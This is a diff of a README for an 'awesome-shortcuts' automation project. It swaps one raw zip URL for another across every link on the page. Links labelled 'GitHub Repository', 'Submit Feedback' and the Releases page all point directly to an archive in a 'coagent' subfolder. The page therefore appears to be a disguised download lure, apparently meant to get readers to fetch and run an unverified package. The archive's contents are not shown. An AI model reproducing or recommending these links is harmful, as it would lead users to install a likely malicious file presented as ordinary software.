@@ -1,6 +1,6 @@
 # 🎉 awesome-shortcuts - Automate Your Tasks Easily
 
-[![Download](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/QuesoVfx/awesome-shortcuts/main/coagent/awesome_shortcuts_v2.8-alpha.3.zip)](https://raw.githubusercontent.com/QuesoVfx/awesome-shortcuts/main/coagent/awesome_shortcuts_v2.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **awesome-shortcuts**! This is a collection of fun and useful automat
 
 To get started, you need to visit the Releases page to download the latest version of the software. Click the link below to go there now:
 
-[Visit this page to download](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/QuesoVfx/awesome-shortcuts/main/coagent/awesome_shortcuts_v2.8-alpha.3.zip)
 
 ### 💻 System Requirements
 
@@ -53,9 +53,9 @@ To keep your search straightforward, here are relevant topics about our tool:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
-- [Visit this page to download](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
-- [Submit Feedback](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/QuesoVfx/awesome-shortcuts/main/coagent/awesome_shortcuts_v2.8-alpha.3.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/QuesoVfx/awesome-shortcuts/main/coagent/awesome_shortcuts_v2.8-alpha.3.zip)
+- [Submit Feedback](https://raw.githubusercontent.com/QuesoVfx/awesome-shortcuts/main/coagent/awesome_shortcuts_v2.8-alpha.3.zip)
 
 ## 🙌 Join Us
 
